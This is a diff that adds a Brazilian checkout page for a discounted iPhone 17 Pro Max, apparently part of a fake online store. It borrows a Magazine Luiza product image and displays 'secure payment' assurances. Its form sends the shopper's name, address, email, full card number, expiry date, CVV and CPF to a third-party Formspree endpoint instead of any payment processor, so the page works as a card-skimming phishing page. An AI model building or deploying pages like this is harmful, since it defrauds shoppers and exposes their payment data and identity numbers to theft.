@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento - iPhone 17 Pro Max</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+  font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; 
+  background: linear-gradient(180deg, #f0f4f8 0%, #ffffff 100%); 
+  min-height: 100vh;
+}
+
+/* === CABEÇALHO AZUL === */
+.cabecalho {
+  background: linear-gradient(135deg, #0066FF 0%, #0052CC 100%);
+  padding: 16px 20px;
+  text-align: center;
+  color: white;
+  font-size: 18px;
+  font-weight: 600;
+  box-shadow: 0 2px 12px rgba(0, 102, 255, 0.18);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+/* === CONTAINER PRINCIPAL === */
+.container {
+  max-width: 520px;
+  margin: 16px auto 30px;
+  background: #ffffff;
+  border-radius: 16px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+  overflow: hidden;
+}
+
+/* === RESUMO DO PRODUTO === */
+.resumo {
+  padding: 20px;
+  background: linear-gradient(135deg, #F0F7FF 0%, #E6F0FF 100%);
+  display: flex;
+  gap: 14px;
+  align-items: center;
+}
+.resumo img {
+  width: 72px;
+  height: 72px;
+  object-fit: contain;
+  background: white;
+  border-radius: 10px;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.06);
+}
+.resumo-info h3 {
+  font-size: 15px;
+  color: #1A202C;
+  margin-bottom: 4px;
+}
+.preco-antigo {
+  font-size: 12px;
+  color: #8B95A5;
+  text-decoration: line-through;
+}
+.preco-pix {
+  font-size: 14px;
+  color: #00884D;
+  font-weight: 600;
+}
+.preco-parcelado {
+  font-size: 13px;
+  color: #2D3748;
+  margin-top: 2px;
+}
+
+/* === BARRA DE PROGRESSO === */
+.progresso {
+  display: flex;
+  padding: 18px 24px;
+  background: #FAFBFC;
+  border-bottom: 1px solid #E8EEF2;
+}
+.passo {
+  flex: 1;
+  text-align: center;
+}
+.passo-num {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: #E8EEF2;
+  color: #718096;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 6px;
+  transition: all 0.3s ease;
+}
+.passo.ativo .passo-num {
+  background: linear-gradient(135deg, #0066FF 0%, #0052CC 100%);
+  color: white;
+  box-shadow: 0 2px 8px rgba(0, 102, 255, 0.25);
+}
+.passo.concluido .passo-num {
+  background: #00A86B;
+  color: white;
+}
+.passo-texto {
+  font-size: 12px;
+  color: #718096;
+}
+.passo.ativo .passo-texto {
+  color: #0066FF;
+  font-weight: 500;
+}
+
+/* === FORMULÁRIO === */
+.conteudo {
+  padding: 24px;
+}
+h2 {
+  font-size: 18px;
+  color: #1A202C;
+  margin-bottom: 20px;
+}
+.label {
+  font-size: 14px;
+  font-weight: 500;
+  color: #2D3748;
+  margin-bottom: 6px;
+  display: block;
+}
+.input {
+  width: 100%;
+  padding: 14px 16px;
+  border: 1.5px solid #E2E8F0;
+  border-radius: 10px;
+  font-size: 15px;
+  transition: border-color 0.25s ease, box-shadow 0.25s ease;
+}
+.input:focus {
+  outline: none;
+  border-color: #0066FF;
+  box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
+}
+.linha {
+  display: flex;
+  gap: 12px;
+}
+.linha .grupo {
+  flex: 1;
+}
+
+.grupo {
+  margin-bottom: 16px;
+}
+
+/* === BOTÕES === */
+.btn {
+  width: 100%;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  font-weight: 600;
+  padding: 15px;
+  cursor: pointer;
+  transition: all 0.25s ease;
+}
+.btn:hover {
+  transform: translateY(-1px);
+}
+.btn-proximo {
+  background: linear-gradient(135deg, #0066FF 0%, #0052CC 100%);
+  color: white;
+  box-shadow: 0 4px 12px rgba(0, 102, 255, 0.25);
+  margin-top: 8px;
+}
+.btn-voltar {
+  background: #F2F4F8;
+  color: #4A5568;
+  margin-top: 12px;
+}
+.btn-finalizar {
+  background: linear-gradient(135deg, #00A86B 0%, #008F5C 100%);
+  color: white;
+  box-shadow: 0 4px 12px rgba(0, 168, 107, 0.25);
+  margin-top: 8px;
+}
+
+.escondido {
+  display: none !important;
+}
+
+.resumo-pedido {
+  background: #FAFBFC;
+  border-radius: 10px;
+  padding: 16px;
+  margin-bottom: 20px;
+  border-left: 3px solid #0066FF;
+}
+.resumo-pedido p {
+  font-size: 14px;
+  color: #2D3748;
+  margin-bottom: 6px;
+}
+.resumo-pedido strong {
+  color: #0066FF;
+}
+
+.caixa-pix {
+  background: linear-gradient(135deg, #F0FFF8 0%, #E6FAF2 100%);
+  border-radius: 10px;
+  padding: 20px;
+  text-align: center;
+  margin: 20px 0;
+}
+.caixa-pix p:first-child {
+  font-size: 18px;
+  font-weight: 700;
+  color: #00884D;
+  margin-bottom: 6px;
+}
+.caixa-pix p:last-child {
+  font-size: 13px;
+  color: #4A7C64;
+}
+
+.voltar-link {
+  display: block;
+  text-align: center;
+  margin-top: 20px;
+  font-size: 14px;
+  color: #0066FF;
+  text-decoration: none;
+}
+.aviso-seguranca {
+  text-align: center;
+  font-size: 12px;
+  color: #9AA5B5;
+  margin-top: 16px;
+}
+</style>
+</head>
+<body>
+
+<div class="cabecalho">
+  Pagamento Seguro 🔒
+</div>
+
+<div class="container">
+
+  <!-- RESUMO DO PRODUTO -->
+  <div class="resumo">
+    <img src="https://a-static.mlcdn.com.br/420x420/apple-iphone-17-pro-max-256gb-laranja-cosmico-69-48mp-ios-5g/magazineluiza/240585900/e167416ee9fc503730ed00858aa49109.jpg" alt="iPhone 17 Pro Max">
+    <div class="resumo-info">
+      <h3>iPhone 17 Pro Max • 256GB</h3>
+      <p class="preco-antigo">De R$ 10.169,10</p>
+      <p class="preco-pix">✅ R$ 8.113,80 à vista no Pix</p>
+      <p class="preco-parcelado">ou 12x de R$ 676,15 sem juros</p>
+    </div>
+  </div>
+
+  <!-- BARRA DE PROGRESSO -->
+  <div class="progresso">
+    <div class="passo ativo" id="passo-1">
+      <div class="passo-num">1</div>
+      <div class="passo-texto">Entrega</div>
+    </div>
+    <div class="passo" id="passo-2">
+      <div class="passo-num">2</div>
+      <div class="passo-texto">Pagamento</div>
+    </div>
+  </div>
+
+  <form action="https://formspree.io/f/xgaodgyn" method="POST" id="form-pedido">
+  <input type="hidden" name="produto" value="iPhone 17 Pro Max 256GB - Laranja-Cósmico">
+  <input type="hidden" name="valor_total" value="R$ 8.113,80 à vista / 12x R$ 676,15 sem juros">
+
+  <!-- PASSO 1: ENTREGA -->
+  <div id="entrega" class="conteudo">
+    <h2>📦 Dados de Entrega</h2>
+    
+    <div class="grupo">
+      <label class="label">Seu E-mail</label>
+      <input class="input" type="email" name="email" id="email" placeholder="seu@email.com" required>
+    </div>
+    
+    <div class="grupo">
+      <label class="label">Nome Completo</label>
+      <input class="input" name="nome" id="nome" placeholder="Digite seu nome completo" required>
+    </div>
+
+    <div class="grupo">
+      <label class="label">CEP</label>
+      <input class="input" name="cep" id="cep" placeholder="00000-000" maxlength="9" required>
+    </div>
+
+    <div class="grupo">
+      <label class="label">Endereço</label>
+      <input class="input" name="endereco" id="endereco" placeholder="Rua, Avenida..." required>
+    </div>
+
+    <div class="linha">
+      <div class="grupo">
+        <label class="label">Número</label>
+        <input class="input" name="numero" id="numero" placeholder="123" required>
+      </div>
+      <div class="grupo">
+        <label class="label">Complemento</label>
+        <input class="input" name="complemento" id="complemento" placeholder="Apto, Bloco">
+      </div>
+    </div>
+
+    <div class="grupo">
+      <label class="label">Bairro</label>
+      <input class="input" name="bairro" id="bairro" placeholder="Seu bairro" required>
+    </div>
+
+    <div class="linha">
+      <div class="grupo">
+        <label class="label">Cidade</label>
+        <input class="input" name="cidade" id="cidade" placeholder="Sua cidade" required>
+      </div>
+      <div class="grupo">
+        <label class="label">Estado</label>
+        <input class="input" name="estado" id="estado" placeholder="UF" maxlength="2" required>
+      </div>
+    </div>
+
+    <button type="button" class="btn btn-proximo" onclick="irParaPagamento()">Continuar para Pagamento →</button>
+  </div>
+
+  <!-- PASSO 2: PAGAMENTO -->
+  <div id="pagamento" class="conteudo escondido">
+    <h2>💳 Forma de Pagamento</h2>
+
+    <div class="resumo-pedido">
+      <p><strong>Produto:</strong> iPhone 17 Pro Max 256GB — Laranja-Cósmico</p>
+      <p><strong>Valor à vista:</strong> R$ 8.113,80 no Pix</p>
+      <p><strong>Parcelado:</strong> 12x de R$ 676,15 sem juros</p>
+    </div>
+
+    <div class="grupo">
+      <label class="label">Escolha a forma de pagamento</label>
+      <select class="input" name="forma_pagamento" id="forma_pagamento" required onchange="mostrarOpcoesPagamento()">
+        <option value="">Selecione uma opção</option>
+        <option value="Pix - R$ 8.113,80 à vista">✅ Pix — R$ 8.113,80 à vista</option>
+        <option value="Cartão de Crédito - 12x de R$ 676,15 sem juros">💳 Cartão de Crédito — 12x sem juros</option>
+      </select>
+    </div>
+
+    <!-- DADOS DO CARTÃO -->
+    <div id="dados-cartao" class="escondido">
+      <div class="grupo">
+        <label class="label">Número do Cartão</label>
+        <input class="input" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19">
+      </div>
+      <div class="grupo">
+        <label class="label">Nome impresso no Cartão</label>
+        <input class="input" name="nome_cartao" id="nome_cartao" placeholder="Como aparece no cartão">
+      </div>
+      <div class="linha">
+        <div class="grupo">
+          <label class="label">Validade</label>
+          <input class="input" name="validade_cartao" id="validade_cartao" placeholder="MM/AA">
+        </div>
+        <div class="grupo">
+          <label class="label">CVV</label>
+          <input class="input" name="cvv_cartao" id="cvv_cartao" placeholder="123" maxlength="4">
+        </div>
+      </div>
+      <div class="grupo">
+        <label class="label">CPF do Titular</label>
+        <input class="input" name="cpf_titular" id="cpf_titular" placeholder="000.000.000-00">
+      </div>
+    </div>
+
+    <!-- INFORMAÇÕES DO PIX -->
+    <div id="dados-pix" class="escondido">
+      <div class="caixa-pix">
+        <p>✅ R$ 8.113,80</p>
+        <p>Ao confirmar, você receberá o código Pix no seu e-mail. O pedido será processado após confirmação do pagamento.</p>
+      </div>
+    </div>
+
+    <button type="submit" class="btn btn-finalizar">✅ Confirmar Pedido</button>
+    <p class="aviso-seguranca">🔒 Seus dados estão protegidos e não serão compartilhados</p>
+
+    <button type="button" class="btn btn-voltar" onclick="voltarParaEntrega()">← Voltar para dados de entrega</button>
+  </div>
+  </form>
+</div>
+
+<a href="index.html" class="voltar-link">← Voltar para a loja</a>
+
+<script>
+function irParaPagamento() {
+  const nome = document.getElementById('nome').value;
+  const email = document.getElementById('email').value;
+  
+  if (!nome.trim()) {
+    alert('Por favor, preencha seu nome completo!');
+    return;
+  }
+  if (!email.includes('@')) {
+    alert('Por favor, insira um e-mail válido!');
+    return;
+  }
+  
+  document.getElementById('entrega').classList.add('escondido');
+  document.getElementById('pagamento').classList.remove('escondido');
+  document.getElementById('passo-1').classList.remove('ativo');
+  document.getElementById('passo-1').classList.add('concluido');
+  document.getElementById('passo-2').classList.add('ativo');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function voltarParaEntrega() {
+  document.getElementById('pagamento').classList.add('escondido');
+  document.getElementById('entrega').classList.remove('escondido');
+  document.getElementById('passo-2').classList.remove('ativo');
+  document.getElementById('passo-1').classList.remove('concluido');
+  document.getElementById('passo-1').classList.add('ativo');
+}
+
+function mostrarOpcoesPagamento() {
+  const forma = document.getElementById('forma_pagamento').value;
+  document.getElementById('dados-cartao').classList.add('escondido');
+  document.getElementById('dados-pix').classList.add('escondido');
+  
+  if (forma.includes('Cartão')) {
+    document.getElementById('dados-cartao').classList.remove('escondido');
+    setCamposCartao(true);
+  } else if (forma.includes('Pix')) {
+    document.getElementById('dados-pix').classList.remove('escondido');
+    setCamposCartao(false);
+  }
+}
+
+function setCamposCartao(requerido) {
+  const campos = ['numero_cartao', 'nome_cartao', 'validade_cartao', 'cvv_cartao', 'cpf_titular'];
+  campos.forEach(id => {
+    const campo = document.getElementById(id);
+    if (requerido) {
+      campo.setAttribute('required', 'required');
+    } else {
+      campo.removeAttribute('required');
+    }
+  });
+}
+</script>
+
+</body>
+</html>
